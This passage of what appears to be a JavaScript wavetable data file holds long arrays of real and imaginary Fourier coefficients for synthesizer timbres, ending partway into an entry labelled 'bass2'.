.000028, -.000028, .000028, -.000027, .000026, -.000026, .000026, -.000026, .000026, -.000026, .000026, -.000026, .000026, -.000026, .000025, -.003235, .000025, -.000025, .000025, -.000025, .000025, -.000025, .000025, -.00002, .00002, -.00002, .00002, -.00002, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000021, -.000021, .000027, -.000027, .000027, -.000027, .000027, -.000027, .000027, -.000027, .000027, -.000027, .000027, -.000027, .000027, -.000027, .000027, -.000024, .000024, -.000024, .000024, -.000024, .000024, -.000024, .000024, -.000024, .000024, -.000024, .000024, -.000024, .000024, -.000023, .000023, -.000023, .000023, -.000023, .000023, -.000023, .000023, -.000023, .000023, -.000023, .000023, -.000023, .000023, -.001577, .000023, -.000023, .000023, -.000023, .000023, -.000023, .000022, -.000022, .000022, -.000022, .000022, -.000022, .000022, -.000022, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.000021, .000021, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .00002, -.00002, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000019, -.000019, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000018, .000018, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000018, -.000018, .000018, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000017, -.000017, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000388, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000016, -.000016, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000015, -.000015, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000014, -.000014, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000013, -.000013, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ],  imag: [ 0, .163431, -.000002, 0, -.000002, 0, -.000001, .000001, -.000003, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000008, .000001, -.000001, 0, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, 0, -.00002, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -.000044, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000079, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000001, -.000001, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000155, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000002, -.000002, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000003, -.000003, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000004, .000004, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000005, -.000005, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000006, -.000006, .000007, -.000007, .000007, -.000007, .000007, -.000161, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000007, .000007, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000008, .000008, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .000009, -.000009, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .000009, -.000009, .000009, -.000009, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.00001, .00001, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000011, .000011, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, -.000012, .000012, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 ] } ],
	[ "bass2",       { real: [ 0, -.000001, -.085652, .034718, -.036957, .014576, -.005792, .003677, -.002998, .001556, -.000486, .0015, -.000809, .000955, -.000169, .000636, -.000682, .000663, -.000166, .000509, -.00042, .000194, -.000025, .000267, -.000299, .000226, -.000038, .000163, -.000273, .000141, -.000047, .000109, -.000162, .000088, -.000035, .000115, -.000157, .000079, -.000035, .000099, -.000064, .000104, -.00002, .000056, -.0001, .000053, -.000039, .000065, -.000082, .000065, -.000051, .000054, -.00006, .000035, -.000011, .000047, -.000049, .000033, -.00002, .000037, -.000041, .000056, -.000004, .000025, -.000048, .000022, -.000008, .000015, -.000052, .000013, -.000011, .000017, -.000029, .000023, -.000003, .000017, -.000031, .000027, -.000008, .000016, -.000033, .000025, -.000013, .00002, -.000021, .000022, -.000004, .000019, -.000024, .00001, -.000006, .000009, -.000019, .000018, -.000006, .000015, -.000018, .000013, -.000009, .000017, -.000022, .000013, -.000001, .000014, -.000013, .000013, -.000006, .000012, -.000015, .000013, -.000001, .000014, -.000012, .000012, -.000003, .000011, -.000014, .000009, -.000004, .000009, -.000011, .000005, -.000001, .000008, -.00001, .000009, -.000003, .000009, -.000012, .000007, -.000002, .000007, -.000008, .000007, -.000003, .000008, -.000009, .000007, -.000003, .000007, -.000008, .000006, -.000003, .000005, -.000009, .000006, -.000001, .000005, -.000007, .000005, -.000001, .000005, -.000008, .000004, -.000001, .000005, -.000006, .000005, -.000001, 